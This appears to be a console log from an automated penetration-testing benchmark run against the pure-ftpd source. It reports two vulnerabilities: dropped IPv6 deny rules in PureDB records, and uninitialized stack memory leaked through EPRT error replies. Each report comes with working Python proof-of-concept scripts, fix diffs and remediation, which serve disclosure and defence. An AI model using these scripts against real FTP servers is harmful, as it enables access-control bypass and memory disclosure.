@@ -1,0 +1,394 @@
+09:23:18 - LiteLLM:WARNING: get_model_cost_map.py:397 - LiteLLM: model cost map fetch attempt 1/3 failed (ReadTimeout fetching https://raw.githubusercontent.com/BerriAI/litellm/main/model_prices_and_context_window.json: The read operation timed out); retrying in 2.5s
+09:23:18 - LiteLLM:WARNING: get_model_cost_map.py:775 - LiteLLM: Failed to fetch remote model cost map from https://raw.githubusercontent.com/BerriAI/litellm/main/model_prices_and_context_window.json: ReadTimeout fetching https://raw.githubusercontent.com/BerriAI/litellm/main/model_prices_and_context_window.json: The read operation timed out. Falling back to local backup.
+
+
+╭─ STRIX ──────────────────────────────────────────────────────────────────────╮
+│                                                                              │
+│  Penetration test initiated                                                  │
+│                                                                              │
+│  Target                                                                      │
+│  /vol1/1000/mygoldmine-benchmark/2026-11-17/results/strix/pure-ftpd/source   │
+│  Output  strix_runs/source_f236                                              │
+│                                                                              │
+│  Vulnerabilities will be displayed in real-time.                             │
+│                                                                              │
+╰──────────────────────────────────────────────────────────────────────────────╯
+
+
+╭─ VULN-0001 ──────────────────────────────────────────────────────────────────╮
+│                                                                              │
+│  Vulnerability Report                                                        │
+│                                                                              │
+│  Title: PureDB IPv6 allow/deny IP rules are silently discarded, bypassing    │
+│  per-user deny lists                                                         │
+│                                                                              │
+│  Severity: LOW                                                               │
+│                                                                              │
+│  CVSS Score: 3.1                                                             │
+│                                                                              │
+│  Target: /workspace/source                                                   │
+│                                                                              │
+│  Endpoint: src/pure-pw.c (record writer) -> src/log_puredb.c (record reader  │
+│  and rule evaluation)                                                        │
+│                                                                              │
+│  CVSS Vector: AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N                            │
+│                                                                              │
+│  Description                                                                 │
+│  PureDB records are colon-separated and pure-pw writes per-user allow/deny   │
+│  IP patterns verbatim, while the daemon reads the fields positionally. An    │
+│  IPv6 address literal contains colons, so configuring one writes extra       │
+│  fields: the deny pattern is silently dropped and a client from the denied   │
+│  address still authenticates. The allow-list variant shifts a fragment into  │
+│  the time-restriction field, which denies every login and also drops the     │
+│  allow restriction.                                                          │
+│                                                                              │
+│  Impact                                                                      │
+│  A per-user network restriction configured through the documented            │
+│  administrative interface is silently not enforced. Any client holding       │
+│  valid credentials for the account can authenticate from the address the     │
+│  administrator intended to deny - and, because the rule disappears rather    │
+│  than degrading, from any other address as well. For allow lists the         │
+│  account becomes unusable, denying the legitimate user while the address     │
+│  restriction is also lost. The 1.0.54 changelog states that IP access rules  │
+│  now support IPv6 patterns; that does not hold for IPv6 address literals.    │
+│                                                                              │
+│  Technical Analysis                                                          │
+│  A PureDB (virtual-user) record is one line of fields separated by           │
+│  PW_LINE_SEP (`:`). The daemon reads it positionally in                      │
+│  pw_puredb_parseline(): position 13 is the allowed local IP, 14 denied       │
+│  local IP, 15 allowed client IP, 16 denied client IP and 17 the time         │
+│  restrictions. pure_strtok2() in src/utils.c performs a plain                │
+│  single-character split with no quoting or escaping, and the writer          │
+│  add_new_pw_line() in src/pure-pw.c prints each pattern with `%s` without    │
+│  validation:\n\n```c title=src/pure-pw.c startLineNumber=711                 │
+│  endLineNumber=731\n    if (pwinfo->allow_local_ip != NULL) {\n              │
+│  fprintf(fp2, "%s", pwinfo->allow_local_ip);   /* allowed local ip */\n      │
+│  }\n    ...\n    if (pwinfo->deny_client_ip != NULL) {\n                     │
+│  fprintf(fp2, "%s", pwinfo->deny_client_ip);   /* denied client ip */\n      │
+│  }\n```\n\nWith `-R '::1/128'` the two colons of the literal add two         │
+│  separators, so the deny column at position 16 is empty and `1/128` is       │
+│  pushed to position 18, which the parser never reads. access_ip_check()      │
+│  therefore sees an empty deny list and returns success for every address;    │
+│  pure-pw show also reports an empty deny list, so the misconfiguration is    │
+│  invisible to the operator. With `-r '::1/128'` (allow list) the fragment    │
+│  lands in the time-restriction column, time_restrictions_check() cannot      │
+│  parse it and returns -1, so every login is denied while the allow           │
+│  restriction is also gone.\n\nThe IPv6 CIDR matcher in access_ip_match()     │
+│  (ipv6_cidr_match() plus inet_pton(AF_INET6, ...)) is correct but cannot be  │
+│  reached with an IPv6 literal through the product's only rule-writing        │
+│  interface, because such a literal can never occupy a single                 │
+│  colon-separated field. IPv6 hostname rules contain no colon and do work.    │
+│                                                                              │
+│  PoC Description                                                             │
+│  1. Build the tree and use the in-tree `src/pure-pw` and                     │
+│  `src/pure-ftpd`.\n2. Create a virtual user whose client-IP deny list        │
+│  contains an IPv6 literal: `pure-pw useradd <login> -f <passwd> -u <uid> -g  │
+│  <gid> -d <home> -R '::1/128'`.\n3. Create a control user with an IPv4 deny  │
+│  rule: `-R '127.0.0.1/32'`.\n4. Inspect the generated password lines: the    │
+│  IPv6 record has extra fields (`...:::::1/128:`) and an empty deny column;   │
+│  the IPv4 record is well formed.\n5. Build the database with `pure-pw mkdb   │
+│  <puredb> -f <passwd>` and start `pure-ftpd -S <port> -E -j -A -l            │
+│  puredb:<puredb>`.\n6. Log in as the IPv6-denied user from the IPv6          │
+│  loopback address: the server answers `230 OK`, so the deny rule is not      │
+│  enforced.\n7. Log in as the IPv4-denied control user from the IPv4          │
+│  loopback address: the server answers `530 Login authentication failed`,     │
+│  proving the deny mechanism itself works and only the IPv6 rule was          │
+│  dropped.\n8. Log in as the user configured with `-r '::1/128'` (allow       │
+│  list): the server answers `530` because the shifted fragment became an      │
+│  unparsable time restriction.                                                │
+│                                                                              │
+│  PoC Code                                                                    │
+│  #!/usr/bin/env python3\n"""PureDB IPv6 allow/deny rules are silently        │
+│  discarded.\nRun from the repository root as root after building             │
+│  src/pure-pw and src/pure-ftpd."""\nimport os, socket, subprocess,           │
+│  time\n\nPURE_PW, PURE_FTPD = "./src/pure-pw", "./src/pure-ftpd"\nWORK =     │
+│  "/var/tmp/pf-iprule-poc"\nPASSWD, DB = WORK + "/passwd", WORK +             │
+│  "/puredb"\nHOME, PORT, UID, PW = "/var/ftproot/user", 2121, 1000,           │
+│  "changeme"\n\ndef add_user(login, extra):\n    r =                          │
+│  subprocess.run([PURE_PW, "useradd", login, "-f", PASSWD, "-u", str(UID),\n  │
+│  "-g", str(UID), "-d", HOME] + extra,\n                       input=(PW +    │
+│  "\\n" + PW + "\\n").encode(), capture_output=True)\n    print("useradd      │
+│  %-8s %-18s rc=%d" % (login, " ".join(extra), r.returncode))\n\ndef          │
+│  login(host, user):\n    s = socket.create_connection((host, PORT),          │
+│  timeout=10); s.settimeout(10)\n    def rd():\n        try: return           │
+│  s.recv(65535).decode("latin1")\n        except Exception: return ""\n       │
+│  rd(); s.sendall(b"USER " + user.encode() + b"\\r\\n"); rd()\n               │
+│  s.sendall(b"PASS " + PW.encode() + b"\\r\\n"); r = rd(); s.close()\n        │
+│  return r.strip().splitlines()[0] if r else "<none>"\n\nos.makedirs(WORK,    │
+│  exist_ok=True)\nadd_user("v6deny", ["-R", "::1/128"])        # documented   │
+│  IPv6 deny rule\nadd_user("v4deny", ["-R", "127.0.0.1/32"])   #              │
+│  control\nadd_user("v6allow", ["-r", "::1/128"])       # allow-list          │
+│  variant\nprint("--- password records ---")\nfor line in open(PASSWD):\n     │
+│  print(line.rstrip())\nsubprocess.run([PURE_PW, "mkdb", DB, "-f", PASSWD]);  │
+│  os.chmod(DB, 0o644)\nd = subprocess.Popen([PURE_FTPD, "-S", str(PORT),      │
+│  "-E", "-j", "-A", "-l", "puredb:" + DB])\ntime.sleep(2)\ntry:\n             │
+│  print("::1       v6deny  ->", login("::1", "v6deny"))     # 530 expected,   │
+│  230 observed\n    print("::1       v6allow ->", login("::1", "v6allow"))\n  │
+│  print("127.0.0.1 v4deny  ->", login("127.0.0.1", "v4deny"))\nfinally:\n     │
+│  d.terminate(); d.wait()                                                     │
+│                                                                              │
+│  Code Locations                                                              │
+│                                                                              │
+│    Location 1: src/log_puredb.c:436-441                                      │
+│    Daemon: reject records that still have fields after the last defined      │
+│  column (fail closed)                                                        │
+│    Fix:                                                                      │
+│    -     if (time_restrictions_check(time_restrictions) != 0) {              │
+│          return -1;                                                          │
+│      }                                                                       │
+│                                                                              │
+│      return 0;                                                               │
+│  }                                                                           │
+│    +     if (time_restrictions_check(time_restrictions) != 0) {              │
+│          return -1;                                                          │
+│      }                                                                       │
+│      if (pure_strtok2(&cursor, *PW_LINE_SEP) != NULL) {                      │
+│          return -1;              /* malformed record: unexpected trailing    │
+│  fields */                                                                   │
+│      }                                                                       │
+│                                                                              │
+│      return 0;                                                               │
+│  }                                                                           │
+│                                                                              │
+│    Location 2: src/pure-pw.c:633-635                                         │
+│    pure-pw: refuse to write an IP rule containing the field separator        │
+│    Fix:                                                                      │
+│    -     if (fp2 == NULL) {                                                  │
+│          return -1;                                                          │
+│      }                                                                       │
+│    +     if (fp2 == NULL) {                                                  │
+│          return -1;                                                          │
+│      }                                                                       │
+│      if ((pwinfo->allow_local_ip != NULL &&                                  │
+│           strchr(pwinfo->allow_local_ip, *PW_LINE_SEP) != NULL) ||           │
+│          (pwinfo->deny_local_ip != NULL &&                                   │
+│           strchr(pwinfo->deny_local_ip, *PW_LINE_SEP) != NULL) ||            │
+│          (pwinfo->allow_client_ip != NULL &&                                 │
+│           strchr(pwinfo->allow_client_ip, *PW_LINE_SEP) != NULL) ||          │
+│          (pwinfo->deny_client_ip != NULL &&                                  │
+│           strchr(pwinfo->deny_client_ip, *PW_LINE_SEP) != NULL)) {           │
+│          fputs("IP access rules cannot contain the ':' field separator;\n"   │
+│                "use a hostname rule for IPv6 clients instead of an address   │
+│  "                                                                           │
+│                "literal.\n", stderr);                                        │
+│          return -1;                                                          │
+│      }                                                                       │
+│                                                                              │
+│  Remediation                                                                 │
+│  Validate the four IP-pattern fields when the record is written so a value   │
+│  containing the record separator is rejected with a clear error instead of   │
+│  corrupting the record, and make the daemon treat a record with more fields  │
+│  than the format defines as invalid so any corrupted or hand-edited entry    │
+│  fails authentication rather than dropping its restrictions. Longer term,    │
+│  add an escape encoding for the field separator to the PureDB record format  │
+│  (writer and reader together, with a version marker) so IPv6 literals can    │
+│  be stored and evaluated, and document hostname rules as the supported way   │
+│  to express IPv6 restrictions in the meantime. Operators that already        │
+│  configured IPv6 literals should re-check affected accounts with pure-pw     │
+│  show and migrate to hostname rules.                                         │
+│                                                                              │
+╰──────────────────────────────────────────────────────────────────────────────╯
+
+╭─ VULN-0002 ──────────────────────────────────────────────────────────────────╮
+│                                                                              │
+│  Vulnerability Report                                                        │
+│                                                                              │
+│  Title: Uninitialized stack memory disclosed in EPRT IPv6 error reply        │
+│                                                                              │
+│  Severity: MEDIUM                                                            │
+│                                                                              │
+│  CVSS Score: 4.3                                                             │
+│                                                                              │
+│  Target: /workspace/source                                                   │
+│                                                                              │
+│  Endpoint: EPRT                                                              │
+│                                                                              │
+│  CVSS Vector: AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N                            │
+│                                                                              │
+│  Description                                                                 │
+│  The IPv6 branch of the EPRT parser builds a struct sockaddr_storage on the  │
+│  stack and fills only the address family and the 16 address bytes, leaving   │
+│  sin6_scope_id uninitialized. When the supplied address differs from the     │
+│  control connection's peer, the structure is passed to                       │
+│  getnameinfo(NI_NUMERICHOST), which appends `%<sin6_scope_id>` to the        │
+│  formatted address and returns uninitialized stack memory to the client in   │
+│  the 500 reply. An authenticated client can read four bytes of process       │
+│  stack per request, and the value changes with the commands executed         │
+│  earlier in the session.                                                     │
+│                                                                              │
+│  Impact                                                                      │
+│  An authenticated client can read four bytes of uninitialized process stack  │
+│  per request through the EPRT error reply, and can influence which stale     │
+│  values are disclosed by the commands it issues first. This is a             │
+│  memory-disclosure primitive that can expose residual process data           │
+│  (including address/layout fragments useful for defeating ASLR in a          │
+│  follow-on exploit); in the tested build the disclosed word contained no     │
+│  directly sensitive value.                                                   │
+│                                                                              │
+│  Technical Analysis                                                          │
+│  The IPv6 branch of the EPRT parser declares the address structure without   │
+│  initializing it:\n\n```c title=src/ftpd.c startLineNumber=838               │
+│  endLineNumber=866\nstatic void do_ipv6_port(char *p, char delim)\n{\n       │
+│  char *deb;\n    struct sockaddr_storage a;        /* uninitialized */\n     │
+│  ...\n    if (generic_aton(deb, &a) != 0) {\n        goto nope;\n    }\n     │
+│  doport2(a, (unsigned int) port);\n}\n```\n\n`generic_aton()` only sets the  │
+│  family (`ss_family`) and the 16 address bytes (`sin6_addr`);                │
+│  `sin6_flowinfo` and `sin6_scope_id` are left with whatever the stack        │
+│  contains. `doport2()` then compares the address with the control            │
+│  connection peer and, when they differ and FXP is not allowed, formats both  │
+│  addresses with `getnameinfo(..., NI_NUMERICHOST)`. glibc's IPv6 formatter   │
+│  appends `%<sin6_scope_id>` whenever the scope id is non-zero, so the        │
+│  uninitialized word is rendered as a decimal suffix in the `500` reply to    │
+│  the client.\n\nThe IPv4 EPRT branch (`memset(&a, 0, sizeof a);` before      │
+│  filling) and `doport()` already do this correctly, which confirms the       │
+│  omission is specific to the IPv6 helper.                                    │
+│                                                                              │
+│  PoC Description                                                             │
+│  1. Build the tree and start `pure-ftpd` locally with a virtual user (for    │
+│  example `pure-ftpd -S <port> -E -j -A -l puredb:<db>`).\n2. Connect and     │
+│  authenticate (`USER`/`PASS`).\n3. Send `EPRT |2|2001:db8::1|1025|` - an     │
+│  IPv6 address that differs from the peer address.\n4. Observe the `500 I     │
+│  won't open a connection to 2001:db8::1%3724148534 (only to 127.0.0.1)`      │
+│  reply: the `%3724148534` suffix is the uninitialized `sin6_scope_id`        │
+│  (0xddf9ff36).\n5. Repeat on a fresh connection without any prior command:   │
+│  the same word is returned. Send a long command first (for example `TYPE`    │
+│  followed by a 4000-byte argument) and repeat the EPRT: the disclosed word   │
+│  changes (0x82e29900), proving it is stale stack content that the client     │
+│  can shape.\n6. Submit a very long EPRT and repeat the same correction, and  │
+│  the value can be sampled across a session; the fix removes the suffix       │
+│  entirely, returning the plain address.                                      │
+│                                                                              │
+│  PoC Code                                                                    │
+│  #!/usr/bin/env python3\n"""Read uninitialized stack memory through the      │
+│  IPv6 EPRT error reply."""\nimport re, socket, sys\n\nHOST, PORT =           │
+│  "127.0.0.1", int(sys.argv[1]) if len(sys.argv) > 1 else 2121\nUSER, PW =    │
+│  "user", "password"\n\ndef sample(shape=None):\n    s =                      │
+│  socket.create_connection((HOST, PORT), timeout=10)\n    s.settimeout(10)\n  │
+│  def rd():\n        try:\n            return                                 │
+│  s.recv(65535).decode("latin1")\n        except Exception:\n                 │
+│  return ""\n    rd()\n    s.sendall(b"USER " + USER.encode() + b"\\r\\n");   │
+│  rd()\n    s.sendall(b"PASS " + PW.encode() + b"\\r\\n"); rd()\n    if       │
+│  shape:\n        s.sendall(shape + b"\\r\\n"); rd()\n    s.sendall(b"EPRT    │
+│  |2|2001:db8::1|1025|\\r\\n")\n    reply = rd()\n    s.close()\n    m =      │
+│  re.search(r"to (\\S+)", reply)\n    return reply.strip(), m.group(1) if m   │
+│  else None\n\nprint("clean session :", sample())\nprint("after TYPE    :",   │
+│  sample(b"TYPE " + b"A" * 4000))\n                                           │
+│                                                                              │
+│  Remediation                                                                 │
+│  Zero the sockaddr_storage before populating it, as the IPv4 EPRT and PORT   │
+│  paths already do, so no uninitialized fields can reach getnameinfo. More    │
+│  generally, initialize every stack sockaddr structure at declaration and     │
+│  consider passing an explicit length from a single construction helper so    │
+│  partially filled address structures cannot be formatted or compared.        │
+│                                                                              │
+╰──────────────────────────────────────────────────────────────────────────────╯
+
+╭─ VULN-0002 (updated) ────────────────────────────────────────────────────────╮
+│                                                                              │
+│  Vulnerability Report                                                        │
+│                                                                              │
+│  Title: Uninitialized stack memory disclosed in EPRT IPv6 error reply        │
+│                                                                              │
+│  Severity: MEDIUM                                                            │
+│                                                                              │
+│  CVSS Score: 4.3                                                             │
+│                                                                              │
+│  Target: /workspace/source                                                   │
+│                                                                              │
+│  Endpoint: EPRT                                                              │
+│                                                                              │
+│  CVSS Vector: AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N                            │
+│                                                                              │
+│  Description                                                                 │
+│  The IPv6 branch of the EPRT parser builds a struct sockaddr_storage on the  │
+│  stack and fills only the address family and the 16 address bytes, leaving   │
+│  sin6_scope_id uninitialized. When the supplied address differs from the     │
+│  control connection's peer, the structure is passed to                       │
+│  getnameinfo(NI_NUMERICHOST), which appends `%<sin6_scope_id>` to the        │
+│  formatted address and returns uninitialized stack memory to the client in   │
+│  the 500 reply. An authenticated client can read four bytes of process       │
+│  stack per request, and the value changes with the commands executed         │
+│  earlier in the session.                                                     │
+│                                                                              │
+│  Impact                                                                      │
+│  An authenticated client can read four bytes of uninitialized process stack  │
+│  per request through the EPRT error reply, and can influence which stale     │
+│  values are disclosed by the commands it issues first. This is a             │
+│  memory-disclosure primitive that can expose residual process data           │
+│  (including address/layout fragments useful for defeating ASLR in a          │
+│  follow-on exploit); in the tested build the disclosed word contained no     │
+│  directly sensitive value.                                                   │
+│                                                                              │
+│  Technical Analysis                                                          │
+│  The IPv6 branch of the EPRT parser declares the address structure without   │
+│  initializing it:\n\n```c title=src/ftpd.c startLineNumber=838               │
+│  endLineNumber=866\nstatic void do_ipv6_port(char *p, char delim)\n{\n       │
+│  char *deb;\n    struct sockaddr_storage a;        /* uninitialized */\n     │
+│  ...\n    if (generic_aton(deb, &a) != 0) {\n        goto nope;\n    }\n     │
+│  doport2(a, (unsigned int) port);\n}\n```\n\n`generic_aton()` only sets the  │
+│  family (`ss_family`) and the 16 address bytes (`sin6_addr`);                │
+│  `sin6_flowinfo` and `sin6_scope_id` are left with whatever the stack        │
+│  contains. `doport2()` then compares the address with the control            │
+│  connection peer and, when they differ and FXP is not allowed, formats both  │
+│  addresses with `getnameinfo(..., NI_NUMERICHOST)`. glibc's IPv6 formatter   │
+│  appends `%<sin6_scope_id>` whenever the scope id is non-zero, so the        │
+│  uninitialized word is rendered as a decimal suffix in the `500` reply to    │
+│  the client.\n\nThe IPv4 EPRT branch (`memset(&a, 0, sizeof a);` before      │
+│  filling) and `doport()` already do this correctly, which confirms the       │
+│  omission is specific to the IPv6 helper.                                    │
+│                                                                              │
+│  PoC Description                                                             │
+│  1. Build the tree and start `pure-ftpd` locally with a virtual user (for    │
+│  example `pure-ftpd -S <port> -E -j -A -l puredb:<db>`).\n2. Connect and     │
+│  authenticate (`USER`/`PASS`).\n3. Send `EPRT |2|2001:db8::1|1025|` - an     │
+│  IPv6 address that differs from the peer address.\n4. Observe the `500 I     │
+│  won't open a connection to 2001:db8::1%3724148534 (only to 127.0.0.1)`      │
+│  reply: the `%3724148534` suffix is the uninitialized `sin6_scope_id`        │
+│  (0xddf9ff36).\n5. Repeat on a fresh connection without any prior command:   │
+│  the same word is returned. Send a long command first (for example `TYPE`    │
+│  followed by a 4000-byte argument) and repeat the EPRT: the disclosed word   │
+│  changes (0x82e29900), proving it is stale stack content that the client     │
+│  can shape.\n6. Submit a very long EPRT and repeat the same correction, and  │
+│  the value can be sampled across a session; the fix removes the suffix       │
+│  entirely, returning the plain address.                                      │
+│                                                                              │
+│  PoC Code                                                                    │
+│  #!/usr/bin/env python3\n"""Read uninitialized stack memory through the      │
+│  IPv6 EPRT error reply."""\nimport re, socket, sys\n\nHOST, PORT =           │
+│  "127.0.0.1", int(sys.argv[1]) if len(sys.argv) > 1 else 2121\nUSER, PW =    │
+│  "user", "password"\n\ndef sample(shape=None):\n    s =                      │
+│  socket.create_connection((HOST, PORT), timeout=10)\n    s.settimeout(10)\n  │
+│  def rd():\n        try:\n            return                                 │
+│  s.recv(65535).decode("latin1")\n        except Exception:\n                 │
+│  return ""\n    rd()\n    s.sendall(b"USER " + USER.encode() + b"\\r\\n");   │
+│  rd()\n    s.sendall(b"PASS " + PW.encode() + b"\\r\\n"); rd()\n    if       │
+│  shape:\n        s.sendall(shape + b"\\r\\n"); rd()\n    s.sendall(b"EPRT    │
+│  |2|2001:db8::1|1025|\\r\\n")\n    reply = rd()\n    s.close()\n    m =      │
+│  re.search(r"to (\\S+)", reply)\n    return reply.strip(), m.group(1) if m   │
+│  else None\n\nprint("clean session :", sample())\nprint("after TYPE    :",   │
+│  sample(b"TYPE " + b"A" * 4000))\n                                           │
+│                                                                              │
+│  Code Locations                                                              │
+│                                                                              │
+│    Location 1: src/ftpd.c:862-864                                            │
+│    Zero the stack address structure before populating it (the IPv4 EPRT      │
+│  path already does this)                                                     │
+│    Fix:                                                                      │
+│    -     if (generic_aton(deb, &a) != 0) {                                   │
+│          goto nope;                                                          │
+│      }                                                                       │
+│    +     memset(&a, 0, sizeof a);                                            │
+│      if (generic_aton(deb, &a) != 0) {                                       │
+│          goto nope;                                                          │
+│      }                                                                       │
+│                                                                              │
+│  Remediation                                                                 │
+│  Zero the sockaddr_storage before populating it, as the IPv4 EPRT and PORT   │
+│  paths already do, so no uninitialized fields can reach getnameinfo. More    │
+│  generally, initialize every stack sockaddr structure at declaration and     │
+│  consider passing an explicit length from a single construction helper so    │
+│  partially filled address structures cannot be formatted or compared.        │
+│                                                                              │
+╰──────────────────────────────────────────────────────────────────────────────╯
+
+benchmark-strix-pure-ftpd
